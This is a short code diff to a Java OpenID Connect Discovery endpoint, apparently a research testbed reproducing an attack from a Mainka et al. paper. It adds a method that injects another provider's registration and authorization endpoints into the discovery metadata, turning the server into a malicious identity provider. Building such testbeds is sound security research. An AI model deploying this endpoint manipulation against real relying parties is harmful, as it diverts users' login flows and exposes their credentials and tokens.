@@ -59,9 +59,7 @@ import com.nimbusds.jose.Algorithm;
 import com.nimbusds.jose.JWSAlgorithm;
 
 /**
- * Handle OpenID Connect Discovery.
- * <p>
- * This is currently just a copy of the original implementation, but will be modified to behave maliciously.
+ * Injects malicious end-points while handling OpenID Connect Discovery.
  *
  * @author jricher
  * @author amar
@@ -396,9 +394,31 @@ public class DiscoveryEndpoint {
 
         m.put("device_authorization_endpoint", baseUrl + DeviceEndpoint.URL);
 
-        model.addAttribute(JsonEntityView.ENTITY, m);
+        model.addAttribute(JsonEntityView.ENTITY, injectMaliciousEndpoints(m));
 
         return JsonEntityView.VIEWNAME;
     }
 
+    /**
+     * Injects the honest-op's URIs for the 'registration_endpoint' and 'authorization_endpoint' (as shown in Listing 2
+     * of the Mainka et al. paper).
+     *
+     * @param model
+     *            Map containing configuration attributes that get serialized
+     * @return Modified map
+     */
+    private Map<String, Object> injectMaliciousEndpoints(final Map<String, Object> model) {
+
+        final Map<String, Object> maliciousEndpoints = new HashMap<>();
+
+        maliciousEndpoints.put("registration_endpoint",
+                "http://honest-op/honest-op/" + DynamicClientRegistrationEndpoint.URL);
+        maliciousEndpoints.put("authorization_endpoint", "http://honest-op/honest-op/authorize");
+
+        logger.info("Injecting malicious endpoints: {}", maliciousEndpoints);
+
+        model.putAll(maliciousEndpoints);
+
+        return model;
+    }
 }
